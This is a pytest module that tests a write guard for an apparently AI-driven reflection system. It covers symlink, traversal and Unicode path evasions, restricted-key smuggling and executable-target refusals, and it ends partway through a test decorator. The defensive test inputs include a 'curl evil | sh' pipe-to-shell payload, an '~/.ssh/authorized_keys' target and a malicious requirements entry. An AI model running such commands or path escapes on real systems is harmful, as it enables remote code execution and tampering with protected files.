"""The hard-stop is enforced at the WRITER, and one path policy decides both sides.

The whole 314-test reflection suite passed while two holes were open, and it is
worth being precise about why, because it is a property of the tests' shape and
not of their thoroughness:

* **No test ever handed a writer a forbidden target.** Every hard-stop assertion
  went through ``validate_proposal``. ``apply_yaml_change`` and
  ``write_document_change`` were only ever called with benign paths, so the fact
  that neither consulted the hard-stop set was invisible — and
  ``POST /reflection/{id}/approve`` calls ``apply_proposal`` with no validator
  anywhere on the path. The suite tested the door while the wall was missing.

* **No test ever created a symlink.** With every path in the corpus a plain
  literal, a textual ``posixpath.normpath`` check and a filesystem
  ``Path.resolve()`` write agree on every input, so no assertion could tell the
  two apart. The divergence needed a link to become visible at all.

* **No test compared the two sides' verdicts.** Validator behaviour and writer
  behaviour were asserted separately, against separately chosen inputs. A
  disagreement between them was not a thing any assertion could fail on, which
  is what let one say ``ok=True`` about the file the other was overwriting.

So the tests here are organised around those three gaps: writer-first
enforcement, a symlink corpus, and a differential check that fails the moment
the validator and the writer disagree about any input at all.
"""

from __future__ import annotations

import json
import os
import re
import stat
import subprocess
import unicodedata
from pathlib import Path
from typing import Any

import pytest

from omniagentos.contracts import utc_now_iso
from omniagentos.db.store import SqliteStore
from omniagentos.reflection import apply as apply_mod
from omniagentos.reflection import guard as guard_mod
from omniagentos.reflection import propose as propose_mod
from omniagentos.reflection.apply import apply_proposal, apply_yaml_change, write_document_change
from omniagentos.reflection.guard import (
    MAX_PAYLOAD_DEPTH,
    ContentKind,
    WriteRefused,
    authorise_write,
    introduced_key_paths,
    is_hard_stop,
    normalise_target_path,
)
from omniagentos.reflection.validate import validate_proposal

LIMITS: dict = {}

GOVERNANCE_BODY = "policy: strict\n"
AGENTS_BODY = "# house rules\n"
GATE_BODY = "#!/bin/sh\necho ok\n"


@pytest.fixture
def repo(tmp_path, monkeypatch):
    """A miniature repo with the symlink shapes the textual check cannot see."""
    root = tmp_path / "repo"
    outside = tmp_path / "outside"
    (root / "configs").mkdir(parents=True)
    (root / "scripts").mkdir(parents=True)
    (root / "docs" / "lessons").mkdir(parents=True)
    outside.mkdir(parents=True)

    (root / "configs" / "governance.yaml").write_text(GOVERNANCE_BODY, encoding="utf-8")
    (root / "configs" / "swarm.yaml").write_text("lane_floors: {}\n", encoding="utf-8")
    (root / "scripts" / "merge-gate.sh").write_text(GATE_BODY, encoding="utf-8")
    (root / "AGENTS.md").write_text(AGENTS_BODY, encoding="utf-8")
    (outside / "loot.txt").write_text("outside\n", encoding="utf-8")

    # A link to a protected DIRECTORY, a link to a protected FILE, a link OUT of
    # the repo, and a link from an allowed directory to an executing surface.
    (root / "docs" / "configs_link").symlink_to(root / "configs")
    (root / "docs" / "gov_link.yaml").symlink_to(root / "configs" / "governance.yaml")
    (root / "docs" / "escape").symlink_to(outside)
    (root / "configs" / "scripts_link").symlink_to(root / "scripts")

    monkeypatch.setenv("OMNIAGENTOS_HOME", str(root))
    return root



def _auth(repo, declared, **kw):
    """``authorise_write`` with a TYPE-CONSISTENT, benign payload.

    The path rules and the content rules are separate concerns, and a path test
    that failed because its payload was wrong would be a test that no longer
    witnesses the path rule. So this supplies whatever the target's own type
    demands, and nothing that any content rule objects to.
    """
    kind = kw.pop("content_kind", None)
    if kind is None:
        kind = (
            ContentKind.CONFIG
            if str(declared).strip().lower().endswith((".yaml", ".yml"))
            else ContentKind.DOCUMENT
        )
    if kind is ContentKind.CONFIG:
        kw.setdefault("key", "lane_floors")
        kw.setdefault("payload", {"complex": ["a"]})
    else:
        kw.setdefault("payload", "body")
    return authorise_write(repo, declared, content_kind=kind, **kw)


def _proposal(kind: str, target: Any) -> dict[str, Any]:
    return {
        "id": "p-1",
        "kind": kind,
        "target": target,
        "current": "",
        "proposed": "wide_open",
        "rationale": "r",
    }


# ---------------------------------------------------------------------------
# The corpus. `refuse=True` entries are evasions; the tail are the negative
# controls that keep "fail closed" from degenerating into "refuse everything".
# ---------------------------------------------------------------------------

CORPUS: list[tuple[str, str, Any, bool]] = [
    # id, kind, target, must_refuse
    ("governance_direct", "model_config", {"file": "configs/governance.yaml", "key": "policy"}, True),
    ("governance_via_dir_symlink", "model_config", {"file": "docs/configs_link/governance.yaml", "key": "policy"}, True),
    ("governance_via_file_symlink", "model_config", {"file": "docs/gov_link.yaml", "key": "policy"}, True),
    ("governance_via_traversal", "model_config", {"file": "configs/../configs/governance.yaml", "key": "policy"}, True),
    ("governance_via_case", "model_config", {"file": "CONFIGS/GOVERNANCE.YAML", "key": "policy"}, True),
    ("gate_script_via_config_symlink", "model_config", {"file": "configs/scripts_link/merge-gate.sh", "key": "a"}, True),
    ("escapes_repo_via_symlink", "model_config", {"file": "docs/escape/loot.yaml", "key": "a"}, True),
    ("escapes_repo_via_traversal", "model_config", {"file": "../outside/loot.yaml", "key": "a"}, True),
    ("restricted_key", "model_config", {"file": "configs/swarm.yaml", "key": "api_key"}, True),
    ("restricted_key_fullwidth", "model_config", {"file": "configs/swarm.yaml", "key": "ＡＰＩ＿ＫＥＹ"}, True),
    ("gate_script_via_fullwidth_traversal", "lesson", {"doc": "docs／..／scripts/merge-gate.sh"}, True),
    ("doc_at_gate_script", "lesson", {"doc": "scripts/merge-gate.sh"}, True),
    ("doc_at_agents_md", "lesson", {"doc": "AGENTS.md"}, True),
    ("doc_at_agents_md_fullwidth", "lesson", {"doc": "ＡＧＥＮＴＳ.md"}, True),
    ("doc_at_governance_via_symlink", "lesson", {"doc": "docs/configs_link/governance.yaml"}, True),
    ("doc_escapes_repo_via_symlink", "lesson", {"doc": "docs/escape/loot.md"}, True),
    ("doc_escapes_repo_via_traversal", "lesson", {"doc": "../outside/loot.md"}, True),
    # Negative controls.
    ("ordinary_config", "model_config", {"file": "configs/swarm.yaml", "key": "lane_floors"}, False),
    ("ordinary_lesson", "lesson", {"doc": "docs/lessons/2026-01-01-note.md"}, False),
    ("untargeted_lesson", "lesson", {}, False),
]

CORPUS_IDS = [row[0] for row in CORPUS]


def _write(root: Path, kind: str, target: Any) -> None:
    """Invoke whichever writer ``apply_proposal`` would dispatch to."""
    if kind == "lesson":
        write_document_change(root, kind, target, "body")
    else:
        apply_yaml_change(root, target, {"a": 1})


# ---------------------------------------------------------------------------
# 1. The writer is the enforcement boundary.
# ---------------------------------------------------------------------------


class TestTheWriterEnforces:
    """No caller may reach a protected file, validator or no validator."""

    @pytest.mark.parametrize("_id,kind,target,refuse", CORPUS, ids=CORPUS_IDS)
    def test_the_writer_refuses_without_any_validator(self, repo, _id, kind, target, refuse):
        if not refuse:
            _write(repo, kind, target)
            return
        with pytest.raises(ValueError):
            _write(repo, kind, target)

    @pytest.mark.parametrize("_id,kind,target,refuse", CORPUS, ids=CORPUS_IDS)
    def test_a_refused_write_leaves_every_protected_file_byte_identical(
        self, repo, _id, kind, target, refuse
    ):
        """Refusing is not enough — it has to refuse before it truncates."""
        if not refuse:
            pytest.skip("negative control; covered above")
        with pytest.raises(ValueError):
            _write(repo, kind, target)
        assert (repo / "configs" / "governance.yaml").read_text(encoding="utf-8") == GOVERNANCE_BODY
        assert (repo / "AGENTS.md").read_text(encoding="utf-8") == AGENTS_BODY
        assert (repo / "scripts" / "merge-gate.sh").read_text(encoding="utf-8") == GATE_BODY

    def test_the_approve_route_entry_point_refuses_and_leaves_the_row_pending(self, repo, tmp_path):
        """``POST /reflection/{id}/approve`` is exactly this call and nothing more.

        omniagentos/api/routes/reflection.py checks the row is ``pending`` and
        then invokes ``apply_proposal`` — no ``validate_proposal`` on the path.
        This is the reproduction from the review, at the boundary the route uses.
        """
        db_path = str(tmp_path / "approve.db")
        store = SqliteStore(db_path)
        now = utc_now_iso()
        with store._lock:
            store._connection.execute(
                """INSERT INTO reflection_proposals
                (id, kind, target, current, proposed, rationale, evidence_refs_json,
                 predicted_impact, risk_class, status, created_at, updated_at)
                VALUES (?,?,?,?,?,?,?,?,?,?,?,?)""",
                (
                    "prop_escalation",
                    "model_config",
                    json.dumps({"file": "docs/configs_link/governance.yaml", "key": "policy"}),
                    "strict",
                    "wide_open",
                    "attacker rationale",
                    "[]",
                    None,
                    "low",
                    "pending",
                    now,
                    now,
                ),
            )

        res = apply_proposal("prop_escalation", db_path=db_path)

        assert res is not None and res["status"] == "failed", res
        assert "hard-stop" in res["error"]
        assert (repo / "configs" / "governance.yaml").read_text(encoding="utf-8") == GOVERNANCE_BODY
        with store._lock:
            row = store._connection.execute(
                "SELECT status FROM reflection_proposals WHERE id = ?", ("prop_escalation",)
            ).fetchone()
        assert row["status"] == "pending", "a refused apply must not promote the row"


# ---------------------------------------------------------------------------
# 2. The symlink bypass, stated as the divergence it was.
# ---------------------------------------------------------------------------


class TestCheckAndWriteAgreeOnWhatAPathMeans:
    def test_the_textual_check_alone_cannot_see_the_link(self, repo):
        """Pins WHY the guard resolves as well as normalises.

        ``is_hard_stop`` is textual by construction and says this path is fine.
        It is right about the string and wrong about the file, which is the
        entire reason it may not be the last word before a write.
        """
        assert is_hard_stop("docs/configs_link/governance.yaml") is False
        with pytest.raises(WriteRefused):
            _auth(repo, "docs/configs_link/governance.yaml")

    def test_the_authoriser_reports_what_the_path_resolved_to(self, repo):
        with pytest.raises(WriteRefused) as excinfo:
            _auth(repo, "docs/configs_link/governance.yaml")
        assert "configs/governance.yaml" in str(excinfo.value)

    def test_a_link_from_a_protected_name_is_refused_too(self, repo, tmp_path):
        """The other direction: laundering by SPELLING a protected name.

        Checking only the resolved path would let ``configs/governance.yaml`` ->
        somewhere harmless through, and the next reader of that name would be
        reading attacker-controlled content.
        """
        (repo / "docs" / "decoy.yaml").write_text("a: 1\n", encoding="utf-8")
        (repo / "configs" / "governance.yaml").unlink()
        (repo / "configs" / "governance.yaml").symlink_to(repo / "docs" / "decoy.yaml")
        with pytest.raises(WriteRefused):
            _auth(repo, "configs/governance.yaml")

    def test_an_authorised_path_is_the_resolved_one(self, repo):
        """A benign link still gets resolved, so the writer opens one known file.

        ``canonical`` is asserted rather than an absolute path because there no
        longer IS a public absolute path: handing back a bare ``Path`` next to a
        path check is what made "examined path, unexamined content" the default.
        The write goes through the handle.
        """
        (repo / "docs" / "notes").mkdir()
        (repo / "docs" / "alias").symlink_to(repo / "docs" / "notes")
        allowed = _auth(repo, "docs/alias/note.md")
        assert allowed.canonical == "docs/notes/note.md"
        assert not hasattr(allowed, "abspath"), (
            "a writable absolute path must not be reachable off the handle"
        )
        assert allowed.write("body") == "docs/notes/note.md"
        assert (repo / "docs" / "notes" / "note.md").read_text(encoding="utf-8") == "body"


# ---------------------------------------------------------------------------
# 3. The differential check. This is the one that fails on any future drift.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("_id,kind,target,refuse", CORPUS, ids=CORPUS_IDS)
def test_the_validator_and_the_writer_return_the_same_verdict(repo, _id, kind, target, refuse):
    """Neither side is allowed to be more permissive than the other, ever.

    The defect was not that either check was individually wrong — each was
    self-consistent. It was that they answered the same question differently,
    and the gap between the answers was the exploit. So the assertion is on the
    AGREEMENT, which no input can satisfy accidentally: it fails whether the
    validator goes soft or the writer does.
    """
    validator_ok, err = validate_proposal(_proposal(kind, target), LIMITS)

    try:
        _write(repo, kind, target)
        writer_ok = True
    except ValueError:
        writer_ok = False

    assert validator_ok == writer_ok, (
        f"validator says ok={validator_ok} ({err!r}) but writer says ok={writer_ok} "
        f"for {kind} -> {target!r}; the check and the write disagree about this path"
    )
    assert validator_ok is not refuse


# ---------------------------------------------------------------------------
# 4. Spellings that must never reach a join or an open().
# ---------------------------------------------------------------------------


def test_the_enforcement_path_does_not_depend_on_the_generation_time_prefilter():
    """``propose.is_hard_stop`` is a second, weaker rule set — kept, and inert.

    It screens model output at generation time and is documented as
    non-authoritative. That claim is only safe while the writers do not consult
    it, so the claim is asserted rather than asserted-in-prose: if a writer ever
    starts trusting the pre-filter, the two rule sets become load-bearing again
    and this fails.
    """
    for module in (guard_mod, apply_mod):
        source = Path(module.__file__).read_text(encoding="utf-8")
        assert "reflection.propose" not in source, (
            f"{module.__name__} imports the generation-time pre-filter; the "
            "write path must depend on guard.authorise_write alone"
        )
    assert guard_mod.is_hard_stop is not propose_mod.is_hard_stop


# ---------------------------------------------------------------------------
# 5. The invariant: NOTHING REACHES DISK UNEXAMINED — path, content, key, mode.
# ---------------------------------------------------------------------------

#: Every write primitive in ``omniagentos/reflection/``, and why each one is
#: allowed to land bytes. This table IS the enumeration: the test below rebuilds
#: it from the source and fails on any line it does not already contain, so a
#: new write cannot be added anywhere in the package without either routing
#: through the chokepoint or being justified here in review.
SANCTIONED_WRITES: dict[tuple[str, str], str] = {
    # --- THE CHOKEPOINT ------------------------------------------------------
    ("guard.py", "self._path.parent.mkdir(parents=True, exist_ok=True)"): (
        "AuthorisedWrite.write: creates the parent of an already-authorised path"
    ),
    ("guard.py", 'self._path.write_text(content, encoding="utf-8")'): (
        "AuthorisedWrite.write: THE byte-landing site for all proposal content"
    ),
    # --- apply.py has NONE. Every proposal-controlled write goes through the
    #     chokepoint above; that absence is the invariant holding. ------------
    # --- system-derived path AND system-generated content --------------------
    ("fable_gate.py", "artifact_dir.mkdir(parents=True, exist_ok=True)"): (
        "gate artifact dir; path is artifact_root/run_id where run_id is a "
        "strftime of the start time, never proposal data"
    ),
    ("fable_gate.py", '(artifact_dir / "verdicts.json").write_text('): (
        "the gate's own verdicts, serialised from its GateResult dataclass"
    ),
    ("fable_gate.py", "log_path.parent.mkdir(parents=True, exist_ok=True)"): (
        "var/improvement-log.jsonl parent; fixed path under the repo root"
    ),
    ("fable_gate.py", 'with log_path.open("a", encoding="utf-8") as log:'): (
        "append-only run log; fixed path, gate-generated JSON line"
    ),
    ("fable_gate.py", "artifact_root.mkdir(parents=True, exist_ok=True)"): (
        "CLI entry point; path comes from --artifact-root (operator argv)"
    ),
    ("fable_gate.py", 'with lock_path.open("w", encoding="utf-8") as lock:'): (
        "flock file under the operator-supplied artifact root; content unused"
    ),
    ("harvest.py", "out_dir.mkdir(parents=True, exist_ok=True)"): (
        "var/reflection/<date>; date-derived, and harvest runs BEFORE any "
        "proposal exists, so there is no proposal content in scope"
    ),
    ("harvest.py", "evidence_json_path.write_text(evidence.model_dump_json(indent=2), encoding=\"utf-8\")"): (
        "harvested evidence serialised from a pydantic model to a fixed name"
    ),
    ("harvest.py", 'digest_md_path.write_text(digest_md, encoding="utf-8")'): (
        "generated digest markdown to a fixed name under the dated dir"
    ),
    ("perrun.py", "retro_dir.mkdir(parents=True, exist_ok=True)"): (
        "var/retro; fixed path under the run root"
    ),
    ("perrun.py", 'with path.open("a", encoding="utf-8") as fh:'): (
        "append-only run-retros.jsonl; fixed name, run telemetry content"
    ),
    ("watchdog.py", "alert_path.parent.mkdir(parents=True, exist_ok=True)"): (
        "vault alert briefing parent; path from default_vault_dir() + date"
    ),
    ("watchdog.py", 'alert_path.write_text("\\n".join(report_lines), encoding="utf-8")'): (
        "the watchdog's own report lines; no proposal content reaches this"
    ),
}

_WRITE_PRIMITIVE = re.compile(
    r"\.write_text\(|\.write_bytes\(|\.open\(\s*[\"'][wax]|\bopen\([^)]*,\s*[\"'][wax]"
    r"|\.mkdir\(|os\.replace\(|shutil\.(?:move|copy|copy2|copytree|rmtree)\("
    r"|\.symlink_to\(|\.touch\(|\.unlink\(|\.rename\(|os\.chmod\(|\.chmod\("
)


def test_every_write_in_the_package_is_enumerated_and_justified():
    """The invariant, made checkable: nothing reaches disk unexamined.

    Three findings across two review rounds were all the same shape — a write
    that no rule looked at — and each was closed by adding a rule beside the
    others. A fourth rule beside three rules is still four judgment sites, so
    what actually has to hold is a property over ALL of them: every byte-landing
    site either goes through ``AuthorisedWrite.write`` or is listed here with a
    reason someone had to write down.

    A new write primitive anywhere in the package fails this test until it does
    one or the other. That is the part the previous rounds lacked: there was no
    way to notice a write that had never been considered.
    """
    package = Path(guard_mod.__file__).resolve().parent
    found: dict[tuple[str, str], int] = {}
    for path in sorted(package.glob("*.py")):
        for lineno, line in enumerate(path.read_text(encoding="utf-8").splitlines(), 1):
            stripped = line.strip()
            if stripped.startswith("#") or not _WRITE_PRIMITIVE.search(stripped):
                continue
            found[(path.name, stripped)] = lineno

    unlisted = sorted(k for k in found if k not in SANCTIONED_WRITES)
    assert unlisted == [], (
        "these writes are not routed through AuthorisedWrite.write and are not "
        "enumerated in SANCTIONED_WRITES — decide which, and say why:\n  "
        + "\n  ".join(f"{name}:{found[(name, src)]}: {src}" for name, src in unlisted)
    )

    stale = sorted(k for k in SANCTIONED_WRITES if k not in found)
    assert stale == [], (
        "SANCTIONED_WRITES lists writes that no longer exist; an over-broad "
        f"allowlist silently sanctions the next one: {stale}"
    )

    assert not any(name == "apply.py" for name, _ in found), (
        "apply.py performed a raw write. Proposal content has exactly one "
        "route to disk and it is AuthorisedWrite.write."
    )


class TestTheContentIsExaminedToo:
    """Round-2 finding C and the fourth face the invariant exposed."""

    def test_a_keyless_config_write_cannot_smuggle_a_bulk_payload(self, repo):
        """The reported repro: RESTRICTED_KEY_WORDS never saw ``proposed``.

        ``apply_yaml_change``'s keyless branch replaced the whole file, and the
        rules only ever inspected the target's path and its ``key``. With no
        ``key`` there was nothing to inspect, and "nothing to inspect" read as
        "nothing objectionable" — favourable absence, again.
        """
        victim = repo / "configs" / "swarm.yaml"
        before = victim.read_text(encoding="utf-8")
        with pytest.raises(WriteRefused):
            apply_yaml_change(
                repo, {"file": "configs/swarm.yaml"}, {"api_key": "stolen", "budget": 999999}
            )
        assert victim.read_text(encoding="utf-8") == before

    def test_the_keyless_refusal_survives_the_primary_authoriser_being_bypassed(
        self, repo, monkeypatch
    ):
        """The test above proves the DOOR refuses. This proves the WALL does too.

        ``apply_yaml_change`` carries a second, defence-in-depth refusal for a
        keyless config write, behind ``authorise_write``'s. Until this test the
        suite could not tell that second refusal from a comment: mutating its
        ``raise`` into ``return ""`` left all 431 reflection tests green,
        because every existing assertion is satisfied by the PRIMARY refusal
        firing first and never reaches the branch at all.

        That is the same favourable-absence shape this module was written
        about, one layer in — so the inner guard is exercised here with the
        outer one stubbed out. A mutant that returns instead of raising lets
        ``key_str.split(".")`` be spelled from ``None``, and the caller then
        records the proposal as promoted-but-ungateable with nothing written:
        a frozen false success indistinguishable from a harmless no-op.
        """
        victim = repo / "configs" / "swarm.yaml"
        before = victim.read_text(encoding="utf-8")

        # Reaching the inner guard takes BOTH stubs, and the reason is the
        # trap this test nearly fell into itself. `WriteRefused` derives from
        # `ValueError`, so a bare `pytest.raises(ValueError)` is satisfied by
        # the OUTER refusal and never reaches the branch under test -- a first
        # draft of this test passed against a `return ""` mutant for exactly
        # that reason. So: the authoriser is delegated to the REAL one with a
        # legitimate key (an AuthorisedWrite is deliberately unforgeable, and
        # a hand-built stand-in would stop witnessing anything), while only
        # the key READER returns None. `allowed` is then authentic and
        # `key_str` is None -- the state a future upstream regression would
        # produce, and the one no existing assertion can reach.
        real_authorise = apply_mod.authorise_write
        monkeypatch.setattr(
            "omniagentos.reflection.apply.authorise_write",
            lambda repo_root, file_path, **kw: real_authorise(
                repo_root, file_path, **{**kw, "key": "lane_floors"}
            ),
        )
        monkeypatch.setattr(
            "omniagentos.reflection.apply.target_key", lambda _target: None
        )

        with pytest.raises(ValueError) as caught:
            apply_yaml_change(
                repo,
                {"file": "configs/swarm.yaml", "key": "lane_floors"},
                {"complex": ["a"]},
            )
        # Must be the INNER guard, not the outer one wearing its base class.
        assert not isinstance(caught.value, WriteRefused), (
            "the outer authoriser refused, so the inner keyless guard was "
            "never exercised and this test witnesses nothing"
        )
        assert "keyless" in str(caught.value)

        # Refusing is only half of it: the file must be byte-identical.
        assert victim.read_text(encoding="utf-8") == before

    def test_a_nested_value_cannot_introduce_a_restricted_key(self, repo):
        """Naming an innocent key does not launder what the value contains."""
        victim = repo / "configs" / "swarm.yaml"
        before = victim.read_text(encoding="utf-8")
        with pytest.raises(WriteRefused):
            apply_yaml_change(
                repo,
                {"file": "configs/swarm.yaml", "key": "lane_floors"},
                {"nested": {"api_key": "stolen"}},
            )
        assert victim.read_text(encoding="utf-8") == before

    def test_introduced_key_paths_are_the_ones_this_write_creates(self):
        """Not the resulting document's keys — only what the write sets.

        Scanning the merged result would refuse every edit to a file that
        legitimately already holds a restricted key, and a rule with false
        positives that loud gets switched off.
        """
        assert introduced_key_paths("lane_floors", {"complex": ["a"]}) == [
            "lane_floors",
            "lane_floors.complex",
        ]
        assert introduced_key_paths(None, {"api_key": 1}) == ["api_key"]

    def test_a_payload_too_deep_to_examine_is_refused_not_skipped(self, repo):
        deep: Any = "leaf"
        for _ in range(MAX_PAYLOAD_DEPTH + 5):
            deep = {"n": deep}
        with pytest.raises(WriteRefused):
            apply_yaml_change(repo, {"file": "configs/swarm.yaml", "key": "a"}, deep)

    @pytest.mark.parametrize(
        "doc,why",
        [
            ("configs/swarm.yaml", "prose appended into a config corrupts it"),
            ("omniagentos/reflection/__init__.py", "executes on the next import"),
            ("sitecustomize.py", "python imports it automatically"),
            ("tools/helper.sh", "a shell script is not a document"),
        ],
    )
    def test_a_document_may_only_land_in_a_document(self, repo, doc, why):
        """The fourth face: target and content type were independent.

        None of these is a path escape — every one is inside the repo, outside
        the protected set, and traverses nothing — so no amount of path checking
        could ever have seen them. They are type errors.
        """
        (repo / "omniagentos" / "reflection").mkdir(parents=True, exist_ok=True)
        (repo / "omniagentos" / "reflection" / "__init__.py").write_text("# pkg\n", encoding="utf-8")
        (repo / "tools").mkdir(exist_ok=True)
        (repo / "tools" / "helper.sh").write_text("#!/bin/sh\n", encoding="utf-8")

        with pytest.raises(WriteRefused):
            write_document_change(repo, "lesson", {"doc": doc}, "curl evil | sh")
        assert not (repo / doc).exists() or "curl evil" not in (repo / doc).read_text(
            encoding="utf-8"
        ), why

    def test_a_config_write_may_only_land_in_yaml(self, repo):
        with pytest.raises(WriteRefused):
            apply_yaml_change(repo, {"file": "configs/notes.md", "key": "a"}, {"b": 1})

    def test_a_write_never_lands_in_something_executable(self, repo):
        """MODE. The witness has an ALLOWED suffix, so only the mode rule can refuse it.

        ``PROTECTED_PREFIXES`` enumerates the executable surfaces we know about
        by name; this asks the filesystem about the ones we do not.
        """
        victim = repo / "docs" / "runnable.md"
        victim.write_text("# doc\n", encoding="utf-8")
        victim.chmod(0o755)
        with pytest.raises(WriteRefused):
            write_document_change(repo, "lesson", {"doc": "docs/runnable.md"}, "curl evil | sh")
        assert victim.read_text(encoding="utf-8") == "# doc\n"

    def test_the_handle_refuses_content_that_is_not_its_declared_type(self, repo):
        allowed = _auth(repo, "configs/swarm.yaml")
        with pytest.raises(WriteRefused):
            allowed.write("- just\n- a list\n")
        with pytest.raises(WriteRefused):
            allowed.write(": not valid yaml: [")


class TestTypeAndModeAgainstALiveFilesystem:
    """Reasoned in review on both sides; these RUN it.

    Rule (f) compares the content kind against the RESOLVED suffix, not the
    declared one — but that distinction had only ever been read, never executed,
    and it is exactly the distinction the symlink bypass turned on the first
    time. If (f) had used the declared name, a ``docs/note.md`` link pointing at
    a module would have landed prose in importable code: a live version of the
    fourth face, reintroduced by the rule meant to close it.
    """

    @pytest.mark.parametrize(
        "victim,body",
        [
            ("omniagentos/reflection/__init__.py", "# pkg\n"),
            ("configs/swarm.yaml", "a: 1\n"),
            ("tools/helper.sh", "#!/bin/sh\n"),
        ],
        ids=["python_module", "yaml_config", "shell_script"],
    )
    def test_a_md_symlink_cannot_launder_a_foreign_file_type(self, repo, victim, body):
        target = repo / victim
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(body, encoding="utf-8")
        (repo / "docs" / "note.md").symlink_to(target)

        with pytest.raises(WriteRefused):
            write_document_change(repo, "lesson", {"doc": "docs/note.md"}, "curl evil | sh")
        assert target.read_text(encoding="utf-8") == body, (
            "the TYPE rule read the declared suffix instead of the resolved one"
        )

    def test_the_reverse_direction_is_allowed_because_the_write_lands_in_a_document(self, repo):
        """Negative control: a foreign-looking spelling that resolves to a document.

        The rule is about where the bytes land, not how the proposal spelled it.
        """
        (repo / "docs" / "real.md").write_text("# doc\n", encoding="utf-8")
        (repo / "docs" / "note.py").symlink_to(repo / "docs" / "real.md")
        written = write_document_change(repo, "lesson", {"doc": "docs/note.py"}, "body")
        assert written == "docs/real.md"

    def test_an_executable_target_reached_through_a_symlink_is_refused(self, repo):
        """MODE, composed with symlink resolution — both rules, one input."""
        victim = repo / "docs" / "real.md"
        victim.write_text("# doc\n", encoding="utf-8")
        victim.chmod(0o755)
        (repo / "docs" / "note.md").symlink_to(victim)
        with pytest.raises(WriteRefused):
            write_document_change(repo, "lesson", {"doc": "docs/note.md"}, "curl evil | sh")
        assert victim.read_text(encoding="utf-8") == "# doc\n"

    def test_a_directory_target_is_refused_as_a_refusal_not_an_oserror(self, repo):
        """Found by running the MODE probe rather than reasoning about it.

        Landing on a directory used to surface as ``IsADirectoryError`` out of
        ``.write()``. That is an ``OSError``, not a ``ValueError``, and every
        caller in this package treats ``ValueError`` as "refused" — so it was a
        refusal nobody was catching by contract.
        """
        (repo / "docs" / "note.md").mkdir()
        with pytest.raises(WriteRefused):
            write_document_change(repo, "lesson", {"doc": "docs/note.md"}, "body")

    @pytest.mark.parametrize("umask_value", [0o000, 0o022, 0o077])
    def test_a_created_document_is_never_executable_at_any_umask(self, repo, umask_value):
        """The write path cannot MAKE something executable, whatever the umask.

        ``write_text`` opens with mode 0o666 & ~umask and never sets an execute
        bit, so the mode rule only ever has to defend pre-existing files.
        """
        previous = os.umask(umask_value)
        try:
            write_document_change(repo, "lesson", {"doc": "docs/fresh.md"}, "body")
        finally:
            os.umask(previous)
        mode = stat.S_IMODE((repo / "docs" / "fresh.md").stat().st_mode)
        assert not mode & 0o111, f"umask {umask_value:04o} produced {mode:04o}"

    def test_a_new_file_under_a_normally_executable_directory_still_writes(self, repo):
        """Negative control: every directory is +x, so the mode rule must not
        read a directory's bit and refuse ordinary writes."""
        assert stat.S_IMODE((repo / "docs").stat().st_mode) & 0o111
        assert write_document_change(repo, "lesson", {"doc": "docs/new.md"}, "b") == "docs/new.md"


class TestAnAuthorisedWriteCannotBeForged:
    def test_a_hand_built_handle_is_refused(self, repo):
        """The design says a writable handle implies an examined write.

        Not reachable from the proposal surface — a JSON row cannot construct a
        Python object — but the invariant should not rest on nobody trying, and
        a plain dataclass let a refactor build one in a line.
        """
        with pytest.raises(WriteRefused):
            guard_mod.AuthorisedWrite(
                declared="configs/governance.yaml",
                canonical="configs/governance.yaml",
                content_kind=ContentKind.CONFIG,
                key="policy",
                _path=repo / "configs" / "governance.yaml",
                _token=object(),
            )
        assert (repo / "configs" / "governance.yaml").read_text(
            encoding="utf-8"
        ) == GOVERNANCE_BODY

    def test_the_real_authoriser_still_produces_a_usable_handle(self, repo):
        """Negative control: the sentinel must not break the sanctioned path."""
        assert _auth(repo, "docs/ok.md").write("body") == "docs/ok.md"


class TestDocumentSuffixesAreNarrow:
    @pytest.mark.parametrize(
        "doc", ["requirements.txt", "constraints.txt", "docs/notes.txt"], ids=lambda d: d
    )
    def test_a_txt_target_is_refused(self, repo, doc):
        """``.txt`` was in the allowlist and should not have been.

        A document write's content is unexamined by design, so admitting
        ``.txt`` handed ``requirements.txt`` — a package manifest, protected by
        neither name nor prefix — the same zero scrutiny a lesson note gets.
        No producer in this repo names a ``.txt`` document target.
        """
        with pytest.raises(WriteRefused):
            write_document_change(repo, "lesson", {"doc": doc}, "malicious-package==1.0.0")
        assert not (repo / doc).exists()

    def test_the_remaining_document_suffixes_still_work(self, repo):
        for name in ("a.md", "b.markdown", "c.rst"):
            assert write_document_change(repo, "lesson", {"doc": f"docs/{name}"}, "b")


class TestTheCanonicalPathIsWhatIsReported:
    def test_writers_return_the_resolved_path_so_git_add_can_stage_it(self, repo):
        """``git add`` on a symlink-spelled path fails with *pathspec is beyond a
        symbolic link*, and ``git_commit_change`` swallows that into a log line —
        so a permitted write silently never reached the branch. Reporting the
        canonical path is what makes the audit trail real.
        """
        (repo / "docs" / "notes").mkdir()
        (repo / "docs" / "alias").symlink_to(repo / "docs" / "notes")
        written = write_document_change(repo, "lesson", {"doc": "docs/alias/note.md"}, "body")
        assert written == "docs/notes/note.md"
        assert (repo / written).is_file()

        subprocess.run(["git", "init", "-q"], cwd=repo, check=True)
        staged = subprocess.run(
            ["git", "add", written], cwd=repo, capture_output=True, text=True
        )
        assert staged.returncode == 0, staged.stderr

    def test_the_yaml_lane_reports_the_resolved_path_too(self, repo):
        """Found by mutation testing: the config lane had no witness for this.

        The document lane was covered above, and the two writers were assumed to
        behave alike — which is the incomplete-propagation shape: one fix, two
        call sites, one of them tested. Mutating ``apply_yaml_change`` to return
        the declared spelling survived the whole suite until this existed.
        """
        (repo / "configs" / "real").mkdir()
        (repo / "configs" / "alias").symlink_to(repo / "configs" / "real")
        written = apply_yaml_change(
            repo, {"file": "configs/alias/x.yaml", "key": "lane_floors"}, {"complex": ["a"]}
        )
        assert written == "configs/real/x.yaml"

        subprocess.run(["git", "init", "-q"], cwd=repo, check=True)
        staged = subprocess.run(
            ["git", "add", written], cwd=repo, capture_output=True, text=True
        )
        assert staged.returncode == 0, staged.stderr


class TestSpellingsRefusedBeforeTheJoin:
    def test_absolute_paths_never_reach_the_join(self, repo, tmp_path):
        """``Path(root) / "/abs"`` is ``/abs`` — pathlib drops the left operand.

        An absolute target therefore escapes containment by being JOINED, not
        by traversing, so it has to be refused before the join happens.
        """
        victim = tmp_path / "outside" / "loot.txt"
        before = victim.read_text(encoding="utf-8")
        with pytest.raises(WriteRefused):
            _auth(repo, str(victim))
        assert victim.read_text(encoding="utf-8") == before

    @pytest.mark.parametrize(
        "spelling",
        ["~/.ssh/authorized_keys", "docs/../../outside/loot.md", "\x00docs/x.md", "", "   "],
    )
